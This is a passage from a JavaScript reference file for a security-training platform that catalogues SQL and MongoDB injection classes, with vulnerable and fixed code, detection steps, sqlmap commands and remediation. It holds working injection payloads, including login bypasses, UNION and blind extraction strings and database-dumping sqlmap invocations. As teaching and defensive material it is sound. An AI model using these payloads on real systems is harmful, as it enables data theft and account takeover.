// Copyright (c) 2026 SpartanKing18. All rights reserved.
//
// =============================================================================
// DARKNODE WEB VULNERABILITY MEGA-REFERENCE
// =============================================================================
//
// This file is a comprehensive, technically accurate encyclopedia of web
// application vulnerability classes for use on the darknode.ai learning
// platform. It covers root-cause description, real-world impact, vulnerable
// and fixed code across multiple languages/frameworks, detection methodology
// (automated and manual), remediation guidance, and curated payload sets.
//
// FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE ONLY.
//
// Everything in this file -- payloads, exploit techniques, bypass tricks,
// and testing procedures -- is intended strictly for use against systems
// you own or have explicit written authorization to test (e.g. a signed
// penetration test scope, a bug bounty program's in-scope assets, or a
// personal lab environment such as DVWA, WebGoat, or Juice Shop).
// Unauthorized access to, or testing of, computer systems you do not own
// or lack permission to test is illegal under the Computer Fraud and Abuse
// Act (18 U.S.C. Section 1030), the UK Computer Misuse Act 1990, and
// equivalent legislation in most jurisdictions. The authors and darknode.ai
// assume no liability for misuse of the information contained herein.
// Always obtain explicit written authorization before conducting any
// security testing against a system.
//
// =============================================================================
// STRUCTURE
// =============================================================================
//
// const WEB_VULNS            -- array of vulnerability class objects
// const WEB_HEADERS          -- array of HTTP security header reference objects
// const WEB_PAYLOADS_BY_VULN -- object map of payload arrays keyed by vuln id
//
// Each WEB_VULNS entry has the shape:
//   {
//     id, name, category, cwe, owasp_category,
//     description, impact,
//     examples: [{ title, vulnerable_code, fixed_code, explanation }, ...],
//     detection_methods: [...], tools: [...],
//     automated_testing, manual_testing: [...],
//     remediation, references: [...],
//     difficulty, commonness
//   }
//
// =============================================================================

const WEB_VULNS = [

  // ===========================================================================
  // INJECTION VULNERABILITIES
  // ===========================================================================

  {
    id: "sql-injection-classic",
    name: "SQL Injection (Classic / In-Band)",
    category: "Injection",
    cwe: "CWE-89",
    owasp_category: "A03:2021 - Injection",
    description:
      "Classic SQL injection occurs when untrusted input is concatenated directly into a SQL " +
      "query string without proper parameterization, allowing an attacker to alter the " +
      "structure and logic of the query. The database engine parses attacker-supplied " +
      "characters (quotes, semicolons, comment sequences, boolean operators) as part of the " +
      "query grammar rather than as inert data, which lets the attacker read, modify, or " +
      "delete arbitrary data, bypass authentication logic, or in some configurations execute " +
      "operating system commands via stored procedures such as MSSQL xp_cmdshell.\n\n" +
      "In-band injection means the attacker receives the results of the injected query " +
      "directly in the HTTP response, either as raw error output (error-based) or as part " +
      "of a UNION SELECT merged into the application's normal result set (UNION-based). " +
      "This is the easiest variant to exploit because feedback is immediate: the attacker " +
      "can iterate quickly, enumerate the database schema via information_schema (MySQL, " +
      "PostgreSQL, MSSQL) or ALL_TABLES/ALL_TAB_COLUMNS (Oracle), and exfiltrate data column " +
      "by column. It remains one of the most damaging web vulnerability classes because a " +
      "single injectable parameter can expose an entire database.",
    impact:
      "Full read/write access to the backend database including credentials, PII, payment " +
      "data, and session tokens; authentication bypass via always-true WHERE clauses " +
      "(' OR '1'='1); privilege escalation by modifying role/permission columns; data " +
      "destruction via DROP TABLE or DELETE statements; and in some database configurations, " +
      "remote code execution on the database host (e.g. MSSQL xp_cmdshell, MySQL " +
      "INTO OUTFILE combined with a web-accessible directory, or PostgreSQL COPY FROM " +
      "PROGRAM).",
    examples: [
      {
        title: "PHP + MySQL login bypass via string concatenation",
        vulnerable_code:
          "<?php\n" +
          "$username = $_POST['username'];\n" +
          "$password = $_POST['password'];\n" +
          "$sql = \"SELECT id, username, role FROM users WHERE username = '$username' \" .\n" +
          "       \"AND password = '\" . md5($password) . \"'\";\n" +
          "$result = mysqli_query($conn, $sql);\n" +
          "if (mysqli_num_rows($result) === 1) {\n" +
          "    $row = mysqli_fetch_assoc($result);\n" +
          "    $_SESSION['user'] = $row['username'];\n" +
          "    $_SESSION['role'] = $row['role'];\n" +
          "}\n" +
          "?>",
        fixed_code:
          "<?php\n" +
          "$username = $_POST['username'];\n" +
          "$password = $_POST['password'];\n" +
          "$stmt = $conn->prepare(\n" +
          "    'SELECT id, username, role FROM users WHERE username = ? AND password = ?'\n" +
          ");\n" +
          "$stmt->bind_param('ss', $username, hash('sha256', $password));\n" +
          "$stmt->execute();\n" +
          "$result = $stmt->get_result();\n" +
          "if ($result->num_rows === 1) {\n" +
          "    $row = $result->fetch_assoc();\n" +
          "    session_regenerate_id(true);\n" +
          "    $_SESSION['user'] = $row['username'];\n" +
          "    $_SESSION['role'] = $row['role'];\n" +
          "}\n" +
          "?>",
        explanation:
          "The vulnerable code builds the SQL statement by directly interpolating " +
          "$username into the string. Submitting username=admin'-- as the username field " +
          "turns the query into SELECT id, username, role FROM users WHERE username = " +
          "'admin'-- ' AND password = '...', where -- comments out the password check, " +
          "logging the attacker in as admin without knowing the password. The fixed " +
          "version uses a parameterized query (prepared statement) where the database " +
          "driver sends the query structure and the user-supplied values separately, so " +
          "the values can never be interpreted as SQL syntax regardless of their content. " +
          "It also switches from the broken md5() hash to a stronger hashing routine and " +
          "regenerates the session ID on login to prevent session fixation."
      },
      {
        title: "Node.js + PostgreSQL search endpoint (template literal injection)",
        vulnerable_code:
          "app.get('/api/products/search', async (req, res) => {\n" +
          "  const term = req.query.q;\n" +
          "  const query = `SELECT id, name, price FROM products WHERE name ILIKE '%${term}%'`;\n" +
          "  const result = await pool.query(query);\n" +
          "  res.json(result.rows);\n" +
          "});",
        fixed_code:
          "app.get('/api/products/search', async (req, res) => {\n" +
          "  const term = req.query.q;\n" +
          "  const result = await pool.query(\n" +
          "    'SELECT id, name, price FROM products WHERE name ILIKE $1',\n" +
          "    [`%${term}%`]\n" +
          "  );\n" +
          "  res.json(result.rows);\n" +
          "});",
        explanation:
          "Using a JavaScript template literal to build the SQL string is functionally " +
          "identical to PHP string concatenation -- the attacker fully controls req.query.q " +
          "and can break out of the quoted LIKE pattern with a payload such as " +
          "%' UNION SELECT username, password, 1 FROM admin_users-- -. The fixed version " +
          "passes the wildcard-wrapped term as a bound parameter ($1) to node-postgres, " +
          "which sends it out-of-band from the query text so it can never alter the query " +
          "structure."
      }
    ],
    detection_methods: [
      "Send single-quote, double-quote, and backslash characters in every input parameter and look for SQL syntax errors reflected in the response",
      "Use time-delay payloads (SLEEP, WAITFOR DELAY, pg_sleep) to detect injection when errors are suppressed",
      "Compare application behavior for boolean-true vs boolean-false injected conditions (AND 1=1 vs AND 1=2)",
      "Grep source code / decompiled bytecode for string concatenation or f-strings feeding into query execution functions",
      "Review ORM usage for raw query escapes (e.g. Sequelize sequelize.query with string interpolation, Django .raw(), Hibernate createSQLQuery with concatenation)",
      "Fuzz numeric parameters (IDs) which developers often assume are 'safe' because they look numeric but are still handled as strings"
    ],
    tools: ["sqlmap", "Burp Suite Scanner", "OWASP ZAP", "jSQL Injection", "NoSQLMap (for hybrid ORMs)", "Havij (legacy)", "ghauri"],
    automated_testing:
      "sqlmap is the de facto standard: `sqlmap -u \"https://target/app?id=1\" --batch --level=5 " +
      "--risk=3 --dbs` enumerates databases, and `--technique=BEUSTQ` forces sqlmap to try " +
      "boolean-blind, error-based, UNION, stacked-query, time-blind, and out-of-band " +
      "techniques. For authenticated endpoints, pass session cookies with `--cookie` or a " +
      "raw request file with `-r request.txt` captured from Burp. Burp Suite's active " +
      "scanner and OWASP ZAP's active scan both include SQLi detection rules that fuzz " +
      "parameters with canary strings and monitor for DB error signatures and timing " +
      "anomalies; always confirm scanner findings manually before reporting, since generic " +
      "scanners produce false positives on WAF-normalized error pages.",
    manual_testing: [
      "Identify all injectable surfaces: URL query parameters, POST body fields, JSON/XML body fields, HTTP headers (User-Agent, X-Forwarded-For, Referer), cookies",
      "Inject a single quote (') into each parameter and observe for a 500 error, ODBC/JDBC driver error text, or a blank/altered response",
      "If an error is returned, attempt error-based extraction: for MySQL, use EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()))) to leak data via the error message",
      "If no error is shown, test boolean-blind: append AND 1=1 (expect original page) then AND 1=2 (expect different page/empty result)",
      "If boolean-blind shows no difference, test time-blind: append AND SLEEP(5) for MySQL, ; WAITFOR DELAY '0:0:5'-- for MSSQL, or pg_sleep(5) for PostgreSQL and measure response latency",
      "Determine the number of columns for UNION-based extraction using ORDER BY 1,2,3... until an error occurs, then craft UNION SELECT NULL,NULL,...,version()-- -",
      "Enumerate schema via information_schema.tables and information_schema.columns (MySQL/MSSQL/PostgreSQL) or ALL_TAB_COLUMNS (Oracle)",
      "Extract sensitive columns (username, password, email, api_key) using UNION SELECT or subquery-based extraction, then attempt to crack or reuse any hashes recovered"
    ],
    remediation:
      "Use parameterized queries / prepared statements for every database call -- never build SQL " +
      "by string concatenation or template interpolation, including for identifiers like table " +
      "or column names (use a strict allowlist for those instead, since they cannot be " +
      "parameterized by the driver).\n\n" +
      "Adopt an ORM or query builder that parameterizes by default (Sequelize, TypeORM, " +
      "SQLAlchemy, Hibernate, ActiveRecord) and audit every raw-query escape hatch those " +
      "frameworks provide, since developers frequently reintroduce string concatenation " +
      "there under time pressure.\n\n" +
      "Apply least privilege to the database account used by the application: it should not " +
      "have DROP, ALTER, or access to unrelated schemas, and definitely should not run as a " +
      "DBA-equivalent role. Disable dangerous stored procedures (xp_cmdshell in MSSQL) unless " +
      "explicitly required. Deploy a WAF as defense-in-depth (not as the primary control), " +
      "enable verbose-error suppression in production so raw DB errors never reach the client, " +
      "and add input validation as a secondary layer (allowlist expected formats for IDs, " +
      "emails, etc.) on top of parameterization.",
    references: [
      "https://owasp.org/www-community/attacks/SQL_Injection",
      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
      "https://portswigger.net/web-security/sql-injection",
      "https://cwe.mitre.org/data/definitions/89.html"
    ],
    difficulty: "Easy",
    commonness: "Very Common"
  },

  {
    id: "sql-injection-union",
    name: "SQL Injection (UNION-Based)",
    category: "Injection",
    cwe: "CWE-89",
    owasp_category: "A03:2021 - Injection",
    description:
      "UNION-based SQL injection abuses the SQL UNION operator to append a second, " +
      "attacker-controlled SELECT statement onto a vulnerable query so its results are " +
      "merged into the application's normal output. This technique requires the attacker " +
      "to first determine the exact number of columns returned by the original query " +
      "(via ORDER BY N or blind UNION SELECT NULL,NULL,... probing) and identify which " +
      "columns are rendered as text on the page, since only those positions are useful for " +
      "exfiltrating string data.\n\n" +
      "Once column count and text-compatible positions are known, the attacker replaces " +
      "NULL placeholders with queries against information_schema or system catalog views " +
      "to enumerate database names, table names, and column names, and finally substitutes " +
      "sensitive columns (credentials, tokens, PII) directly into the visible output. " +
      "UNION-based injection is prized by attackers because it exfiltrates data in a single " +
      "request-response cycle rather than requiring hundreds of blind true/false or timing " +
      "probes.",
    impact:
      "Direct, high-bandwidth exfiltration of arbitrary table contents in a single request; " +
      "full schema enumeration; credential and session token theft; combined with a writable " +
      "database user, UNION SELECT can be paired with INTO OUTFILE (MySQL) to write a " +
      "webshell to disk if the web root is writable by the DB process.",
    examples: [
      {
        title: "Java Spring JDBC search with UNION-injectable parameter",
        vulnerable_code:
          "@GetMapping(\"/api/articles\")\n" +
          "public List<Map<String,Object>> search(@RequestParam String category) {\n" +
          "    String sql = \"SELECT title, summary FROM articles WHERE category = '\" +\n" +
          "                 category + \"' AND published = 1\";\n" +
          "    return jdbcTemplate.queryForList(sql);\n" +
          "}",
        fixed_code:
          "@GetMapping(\"/api/articles\")\n" +
          "public List<Map<String,Object>> search(@RequestParam String category) {\n" +
          "    String sql = \"SELECT title, summary FROM articles WHERE category = ? AND published = 1\";\n" +
          "    return jdbcTemplate.queryForList(sql, category);\n" +
          "}",
        explanation:
          "An attacker submits category=nonexistent' UNION SELECT username, password FROM " +
          "admin_users-- - to make the query return admin credentials in the title/summary " +
          "fields normally used for article data. jdbcTemplate.queryForList(sql, category) " +
          "in the fixed version uses a PreparedStatement under the hood, binding category as " +
          "a literal string value so UNION and other SQL keywords in the input are inert."
      }
    ],
    detection_methods: [
      "Probe column count with ORDER BY 1, ORDER BY 2, ... until an 'unknown column' error occurs",
      "Probe column count blind with UNION SELECT NULL-- -, UNION SELECT NULL,NULL-- - incrementally",
      "Identify text-rendering columns by substituting a recognizable string (e.g. 'zzz_marker') into each NULL position and checking which appear in the response",
      "Confirm database type via version-string functions: version() (MySQL/PostgreSQL), @@version (MSSQL), banner from v$version (Oracle)"
    ],
    tools: ["sqlmap", "Burp Suite Intruder", "manual browser/curl testing"],
    automated_testing:
      "`sqlmap -u \"https://target/articles?category=tech\" --technique=U --dump-all --batch` " +
      "forces UNION-only extraction and dumps all accessible data; use `--union-cols=N` to " +
      "hint the column count if sqlmap's auto-detection is slow, and `--union-char=NULL` " +
      "vs a numeric placeholder if the WAF blocks NULL keywords.",
    manual_testing: [
      "Determine column count via ORDER BY or blind UNION SELECT NULL probing",
      "Determine which columns render as visible text by injecting unique markers per column",
      "Fingerprint the DBMS with version()/@@version/banner queries in a text column",
      "Enumerate table_name from information_schema.tables (or ALL_TABLES for Oracle) filtered to the current database",
      "Enumerate column_name from information_schema.columns for interesting tables (users, accounts, admin, tokens)",
      "Extract data with UNION SELECT column1, column2 FROM target_table-- -, using GROUP_CONCAT/STRING_AGG to pack multiple rows into one output row if the app only shows the first result"
    ],
    remediation:
      "Identical root fix to classic SQL injection: parameterized queries eliminate UNION " +
      "injection entirely because the database never re-parses attacker input as SQL syntax. " +
      "As defense-in-depth, restrict the application's DB account so it cannot read " +
      "information_schema/system catalogs for schemas it does not own, and monitor for " +
      "queries containing UNION SELECT originating from application service accounts as an " +
      "IDS signal.",
    references: [
      "https://portswigger.net/web-security/sql-injection/union-attacks",
      "https://owasp.org/www-community/attacks/SQL_Injection",
      "https://cwe.mitre.org/data/definitions/89.html"
    ],
    difficulty: "Medium",
    commonness: "Very Common"
  },

  {
    id: "sql-injection-blind-boolean",
    name: "SQL Injection (Blind Boolean-Based)",
    category: "Injection",
    cwe: "CWE-89",
    owasp_category: "A03:2021 - Injection",
    description:
      "Blind boolean-based SQL injection is used when the application does not reflect " +
      "database errors or query output directly, but its behavior still changes visibly " +
      "depending on whether an injected conditional expression evaluates to true or false " +
      "(different page content, an extra/missing item in a list, an HTTP 200 vs 302, or a " +
      "'Welcome' vs 'Invalid' message). The attacker exploits this binary oracle to infer " +
      "data one bit or one character at a time using conditional payloads.\n\n" +
      "Typical extraction asks the database yes/no questions such as 'is the first character " +
      "of the admin password hash greater than 'm'?' via SUBSTRING and ASCII comparisons, " +
      "performing a binary search over the character space (roughly 7 requests per character " +
      "for the full printable ASCII range). While slower than UNION-based extraction, it is " +
      "fully automatable with tools like sqlmap and works even against heavily sanitized " +
      "error output, making it the fallback technique whenever direct data reflection is not " +
      "available.",
    impact:
      "Complete database compromise given enough requests -- credentials, PII, and " +
      "application secrets can all be extracted character-by-character; authentication " +
      "bypass remains just as effective as in classic injection since it only requires a " +
      "true/false response, not data reflection.",
    examples: [
      {
        title: "Python Flask 'remember me' cookie check vulnerable to blind boolean injection",
        vulnerable_code:
          "@app.route('/profile')\n" +
          "def profile():\n" +
          "    user_id = request.cookies.get('uid')\n" +
          "    cur.execute(\n" +
          "        f\"SELECT is_active FROM users WHERE id = {user_id}\"\n" +
          "    )\n" +
          "    row = cur.fetchone()\n" +
          "    if row and row[0]:\n" +
          "        return render_template('profile.html')\n" +
          "    return 'Inactive account', 403",
        fixed_code:
          "@app.route('/profile')\n" +
          "def profile():\n" +
          "    user_id = request.cookies.get('uid')\n" +
          "    if not user_id or not user_id.isdigit():\n" +
          "        abort(400)\n" +
          "    cur.execute(\n" +
          "        \"SELECT is_active FROM users WHERE id = %s\", (user_id,)\n" +
          "    )\n" +
          "    row = cur.fetchone()\n" +
          "    if row and row[0]:\n" +
          "        return render_template('profile.html')\n" +
          "    return 'Inactive account', 403",
        explanation:
          "The response only ever shows one of two states (profile page vs 'Inactive " +
          "account'), so an attacker can set the uid cookie to " +
          "1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' " +
          "and watch which of the two responses comes back, iterating over characters and " +
          "positions to fully recover the admin password hash. The fix combines strict input " +
          "validation (digits only) with parameterization, so even a non-numeric or crafted " +
          "value is rejected before it ever reaches the query."
      }
    ],
    detection_methods: [
      "Inject paired true/false conditions (AND 1=1 vs AND 1=2) and diff the full response body, status code, headers, and timing",
      "Use content-length or response hash comparison to catch subtle differences a human reviewer might miss",
      "Test conditions against known-true facts (AND 'a'='a') vs known-false (AND 'a'='b') as a baseline before attempting data extraction"
    ],
    tools: ["sqlmap (--technique=B)", "Burp Suite Intruder with Grep-Match", "wfuzz with response diffing"],
    automated_testing:
      "`sqlmap -u \"https://target/profile\" --cookie=\"uid=1\" --technique=B --batch " +
      "--dbms=mysql` forces boolean-blind mode and reports the differentiator string it " +
      "found; sqlmap will also auto-tune request throttling to avoid rate-limit false " +
      "negatives.",
    manual_testing: [
      "Establish a true/false baseline using always-true and always-false injected conditions",
      "Confirm the oracle is stable (repeat the same true condition multiple times, check for flakiness from caching or load balancing)",
      "Extract the database version, then table names, then column names, then data using nested SUBSTRING/ASCII binary search per character",
      "Automate the character-by-character loop with a small script or Burp Intruder cluster bomb if sqlmap cannot be used against the target"
    ],
    remediation:
      "Same as classic SQL injection: parameterized queries close the vulnerability " +
      "completely regardless of whether the application reflects errors or data. " +
      "Additionally, ensure identical response behavior does not leak information as a " +
      "side channel -- avoid conditionally rendering different templates or status codes " +
      "based on unvalidated, attacker-influenced query results wherever access control " +
      "logic can be abused as an oracle.",
    references: [
      "https://portswigger.net/web-security/sql-injection/blind",
      "https://owasp.org/www-community/attacks/Blind_SQL_Injection"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "sql-injection-blind-time",
    name: "SQL Injection (Blind Time-Based)",
    category: "Injection",
    cwe: "CWE-89",
    owasp_category: "A03:2021 - Injection",
    description:
      "Time-based blind SQL injection is used when the application gives no observable " +
      "difference in content between true and false conditions -- no error, no extra row, " +
      "identical response body -- so the attacker instead uses the database's response " +
      "latency as the oracle. A conditional statement triggers a deliberate delay (SLEEP() " +
      "in MySQL, pg_sleep() in PostgreSQL, WAITFOR DELAY in MSSQL, DBMS_LOCK.SLEEP in " +
      "Oracle) only when the injected condition is true, and the attacker measures wall-clock " +
      "response time to infer the answer.\n\n" +
      "This is the slowest and noisiest injection technique (each bit of data can cost " +
      "seconds of request time, and network jitter can produce false readings), but it is " +
      "also the most universally applicable because it requires no reflected output or " +
      "visible behavioral difference whatsoever -- only that the injected SQL actually " +
      "executes. It is frequently the only viable technique against APIs that return an " +
      "identical generic JSON response for every request.",
    impact:
      "Full data exfiltration is still possible, just slower; can also be used purely to " +
      "confirm injection exists (a reliable 5-second delay on true vs near-zero on false is " +
      "strong proof) before pivoting to a faster technique such as out-of-band exfiltration.",
    examples: [
      {
        title: "MSSQL stored procedure call built from string concatenation in C#/.NET",
        vulnerable_code:
          "string sql = \"EXEC GetOrderStatus '\" + orderId + \"'\";\n" +
          "using (var cmd = new SqlCommand(sql, connection)) {\n" +
          "    var reader = cmd.ExecuteReader();\n" +
          "    // ...\n" +
          "}",
        fixed_code:
          "using (var cmd = new SqlCommand(\"GetOrderStatus\", connection)) {\n" +
          "    cmd.CommandType = CommandType.StoredProcedure;\n" +
          "    cmd.Parameters.Add(\"@OrderId\", SqlDbType.NVarChar, 50).Value = orderId;\n" +
          "    var reader = cmd.ExecuteReader();\n" +
          "}",
        explanation:
          "Because the JSON API returns {\"status\":\"processing\"} regardless of the " +
          "injected payload's truth value, an attacker cannot distinguish true from false by " +
          "content, but orderId = \"1'; IF (SELECT SUBSTRING(password_hash,1,1) FROM users " +
          "WHERE username='admin')='a' WAITFOR DELAY '0:0:5'--\" causes a measurable 5-second " +
          "delay only when the guessed character is correct. Using CommandType.StoredProcedure " +
          "with typed parameters instead of concatenating into an EXEC string removes the " +
          "injection point entirely."
      }
    ],
    detection_methods: [
      "Inject conditional SLEEP/WAITFOR/pg_sleep payloads and measure response time against a baseline over multiple trials to rule out network jitter",
      "Use asynchronous/stacked-query time delays (; WAITFOR DELAY) where the DBMS supports multiple statements per request",
      "Correlate suspiciously consistent N-second delays across many parameters as a strong injection signal even without other symptoms"
    ],
    tools: ["sqlmap (--technique=T)", "Burp Suite (manual timing with Repeater, or Turbo Intruder for statistical timing analysis)"],
    automated_testing:
      "`sqlmap -u \"https://target/api/order?id=1\" --technique=T --time-sec=5 --batch` sets " +
      "the delay window and confirms injection using multiple timing samples with basic " +
      "statistical validation to avoid false positives from network latency.",
    manual_testing: [
      "Establish a clean network latency baseline with several unmodified requests",
      "Send a payload with a 0-second conditional delay expected to be false, confirm timing matches baseline",
      "Send a payload with a condition expected to be true and a 5-10 second delay, confirm the delay is observed",
      "Once confirmed, script the character-by-character binary search extraction, ideally with a small delay window (2-3s) to keep total extraction time manageable and reduce detection footprint",
      "Consider pivoting to out-of-band techniques (DNS exfiltration via UTL_HTTP/xp_dirtree) if timing extraction is too slow for the engagement window"
    ],
    remediation:
      "Parameterized queries and stored procedures called via typed parameters (not string-built " +
      "EXEC statements) remove the vulnerability. Rate-limiting and anomaly detection on " +
      "response-time outliers can help detect ongoing time-based injection attempts in " +
      "production, and query timeouts should be set low enough that classic multi-second " +
      "SLEEP-based exfiltration is disrupted (though this is a mitigation, not a fix).",
    references: [
      "https://portswigger.net/web-security/sql-injection/blind",
      "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
    ],
    difficulty: "Medium",
    commonness: "Common"
  },

  {
    id: "sql-injection-second-order",
    name: "SQL Injection (Second-Order)",
    category: "Injection",
    cwe: "CWE-89",
    owasp_category: "A03:2021 - Injection",
    description:
      "Second-order SQL injection occurs when malicious input is safely stored (often " +
      "correctly parameterized on the way in) but is later read back out of the database " +
      "and unsafely concatenated into a different SQL query elsewhere in the application. " +
      "The payload lies dormant in a column such as a username, display name, or address " +
      "field until a separate code path -- sometimes in a completely different module " +
      "written by a different developer -- builds a new query using that stored value " +
      "without re-parameterizing it.\n\n" +
      "This class is notoriously easy to miss in code review and automated scanning because " +
      "the injection point (the form that stores the value) and the execution point (the " +
      "vulnerable query that reads it back) are decoupled in both time and location. A " +
      "classic example is a user registering with a username of admin'-- , which passes " +
      "safely through a parameterized INSERT, but later triggers injection when an " +
      "'change password' or 'admin audit log' feature builds a query like " +
      "\"UPDATE users SET password=... WHERE username='\" + storedUsername + \"'\".",
    impact:
      "Same ultimate impact as classic SQL injection (data theft, auth bypass, data " +
      "corruption), but harder to detect via black-box scanning since automated tools " +
      "rarely correlate a stored value with a later, unrelated request; often discovered " +
      "only through manual source review or careful multi-step black-box testing.",
    examples: [
      {
        title: "PHP profile update flow: safe insert, unsafe later use in an admin report query",
        vulnerable_code:
          "// Step 1: registration -- correctly parameterized\n" +
          "$stmt = $pdo->prepare('INSERT INTO users (username, email) VALUES (?, ?)');\n" +
          "$stmt->execute([$_POST['username'], $_POST['email']]);\n\n" +
          "// Step 2: admin report generator -- reads username back and concatenates it\n" +
          "function buildActivityReport($username) {\n" +
          "    global $pdo;\n" +
          "    $sql = \"SELECT * FROM activity_log WHERE actor = '$username'\";\n" +
          "    return $pdo->query($sql)->fetchAll();\n" +
          "}\n" +
          "$user = $pdo->query('SELECT username FROM users WHERE id = ' . (int)$_GET['id'])\n" +
          "             ->fetch()['username'];\n" +
          "$report = buildActivityReport($user);",
        fixed_code:
          "// Step 1: registration -- correctly parameterized (unchanged)\n" +
          "$stmt = $pdo->prepare('INSERT INTO users (username, email) VALUES (?, ?)');\n" +
          "$stmt->execute([$_POST['username'], $_POST['email']]);\n\n" +
          "// Step 2: admin report generator -- parameterize even though the value came from the DB\n" +
          "function buildActivityReport($username) {\n" +
          "    global $pdo;\n" +
          "    $stmt = $pdo->prepare('SELECT * FROM activity_log WHERE actor = ?');\n" +
          "    $stmt->execute([$username]);\n" +
          "    return $stmt->fetchAll();\n" +
          "}",
        explanation:
          "A user registers with username admin'-- (safely stored via the parameterized " +
          "INSERT). Weeks later, an administrator generates an activity report for that user, " +
          "and buildActivityReport() concatenates the stored username directly into a new " +
          "query: SELECT * FROM activity_log WHERE actor = 'admin'-- '. The trailing comment " +
          "sequence truncates the intended WHERE clause, and a more damaging payload such as " +
          "x' UNION SELECT username,password,1,1 FROM users-- - would exfiltrate credentials " +
          "the moment any admin views that user's report. The fix treats every query as a " +
          "fresh injection surface regardless of where the data originated, parameterizing " +
          "the second query exactly like the first."
      }
    ],
    detection_methods: [
      "Map every place a stored value (username, address, notes field, filename) is later read back and used in a new query, not just where it is first written",
      "Store SQL metacharacter payloads (', --, ;) in every writable field, then exercise every downstream feature that reads that field (reports, exports, search, admin views, emails)",
      "Review code for query-building functions that accept a parameter without indicating its trust boundary, then trace all call sites"
    ],
    tools: ["Manual source code review", "Burp Suite (multi-step scanning with stored payloads)", "Semgrep / CodeQL custom queries for taint tracking from DB reads to query sinks"],
    automated_testing:
      "Standard scanners largely miss second-order injection because it requires " +
      "correlating a write in one request with an execution in a later, often unrelated " +
      "request. CodeQL's javascript/python/java SQL-injection queries with taint tracking " +
      "configured to treat database read results as tainted sources (not just HTTP request " +
      "data) are the most reliable automated approach; Burp Suite's manual 'stored XSS/SQLi' " +
      "workflow (inject, then browse every feature) is the practical black-box equivalent.",
    manual_testing: [
      "Store SQLi payloads via every input that persists to the database (registration, profile edit, comments, support tickets)",
      "Systematically exercise every feature that could plausibly re-read that stored value: admin panels, exports, search, notifications, audit logs, invoices",
      "Watch for delayed injection symptoms (errors or timing changes appearing on a completely different page/feature than where the payload was submitted)",
      "For internal/whitebox tests, grep the codebase for query-building functions and trace every caller to see if any pass in data sourced from a prior SELECT"
    ],
    remediation:
      "Treat all data as untrusted at the point of use, not the point of entry -- " +
      "parameterize every query, including ones that only ever seem to consume 'our own' " +
      "database data. Establish a coding standard and lint rule (e.g. a Semgrep rule) that " +
      "flags any string concatenation or interpolation feeding a query execution function, " +
      "regardless of the apparent source of the variable.",
    references: [
      "https://owasp.org/www-community/attacks/SQL_Injection",
      "https://portswigger.net/web-security/sql-injection#second-order-sql-injection"
    ],
    difficulty: "Hard",
    commonness: "Uncommon"
  },

  {
    id: "nosql-injection-mongodb",
    name: "NoSQL Injection (MongoDB)",
    category: "Injection",
    cwe: "CWE-943",
    owasp_category: "A03:2021 - Injection",
    description:
      "MongoDB injection exploits applications that pass user-controlled JSON structures " +
      "directly into query operators instead of treating input as scalar values. Because " +
      "MongoDB queries are themselves JSON/BSON documents, an attacker who can control the " +
      "shape of the query object (not just a string within it) can inject operators like " +
      "$ne, $gt, $regex, $where, or $exists to change query semantics entirely -- most " +
      "commonly by sending {\"$ne\": null} or {\"$gt\": \"\"} as a parameter value instead " +
      "of a plain string, which most drivers will happily accept if the request body is " +
      "parsed as JSON and passed straight to find().\n\n" +
      "The most dangerous variant abuses the $where operator or mapReduce, which execute " +
      "arbitrary JavaScript server-side inside the MongoDB engine, enabling data exfiltration " +
      "via conditional logic (similar to blind SQLi) or, in older/misconfigured deployments, " +
      "broader server compromise. Frameworks that auto-parse JSON bodies (Express + " +
      "body-parser, without input shape validation) are especially exposed because query " +
      "operators arrive for free in any nested object field.",
    impact:
      "Authentication bypass (login with {\"username\":\"admin\",\"password\":{\"$ne\":null}}); " +
      "blind data extraction via $regex-based character-by-character guessing; denial of " +
      "service via expensive $where JavaScript execution or unbounded regex backtracking; " +
      "in rare misconfigured deployments, server-side JavaScript execution inside the DB " +
      "process.",
    examples: [
      {
        title: "Express.js login endpoint accepting raw JSON operators",
        vulnerable_code:
          "app.post('/login', async (req, res) => {\n" +
          "  const { username, password } = req.body;\n" +
          "  const user = await db.collection('users').findOne({ username, password });\n" +
          "  if (user) return res.json({ token: signToken(user) });\n" +
          "  return res.status(401).json({ error: 'invalid credentials' });\n" +
          "});",
        fixed_code:
          "const { z } = require('zod');\n" +
          "const loginSchema = z.object({\n" +
          "  username: z.string().min(1).max(64),\n" +
          "  password: z.string().min(1).max(128)\n" +
          "});\n\n" +
          "app.post('/login', async (req, res) => {\n" +
          "  const parsed = loginSchema.safeParse(req.body);\n" +
          "  if (!parsed.success) return res.status(400).json({ error: 'invalid input' });\n" +
          "  const { username, password } = parsed.data;\n" +
          "  const user = await db.collection('users').findOne({ username, password });\n" +
          "  if (user) return res.json({ token: signToken(user) });\n" +
          "  return res.status(401).json({ error: 'invalid credentials' });\n" +
          "});",
        explanation:
          "Sending {\"username\": \"admin\", \"password\": {\"$ne\": \"\"}} as the JSON body " +
          "makes MongoDB match any document where password is not equal to the empty string " +
          "-- true for essentially every account -- logging the attacker in as admin without " +
          "a password. The fix enforces a strict schema (via zod, joi, or manual type checks) " +
          "that rejects any field that is not a plain string of a bounded length, so operator " +
          "objects like {\"$ne\": ...} are rejected before reaching the query."
      }
    ],
    detection_methods: [
      "Submit JSON operator objects ({\"$ne\": null}, {\"$gt\": \"\"}, {\"$regex\": \".*\"}) in place of expected scalar values for every parameter",
      "Test both JSON body fields and query-string parameters (Express parses user[$ne]=1 into a nested operator object via qs library)",
      "Look for authentication bypass, altered result counts, or timing differences when $where with sleep()-equivalent JS is injected"
    ],
    tools: ["NoSQLMap", "Burp Suite (manual JSON tampering + Intruder)", "MongoDB Compass (whitebox verification)"],
    automated_testing:
      "NoSQLMap automates MongoDB injection discovery and exploitation: " +
      "`python nosqlmap.py` then select the HTTP MongoDB attack module, supply the target " +
      "URL and parameter, and it will attempt authentication bypass, enumerate collection " +
      "names, and dump data. For manual confirmation, Burp Repeater with the request body " +
      "changed from \"password\":\"x\" to \"password\":{\"$ne\":\"x\"} is often sufficient.",
    manual_testing: [
      "Identify every endpoint that accepts JSON and queries MongoDB (or another document DB) with fields sourced from that JSON",
      "Replace each scalar value with {\"$ne\": null}, {\"$gt\": \"\"}, and {\"$regex\": \"^a\"} and observe behavior changes",
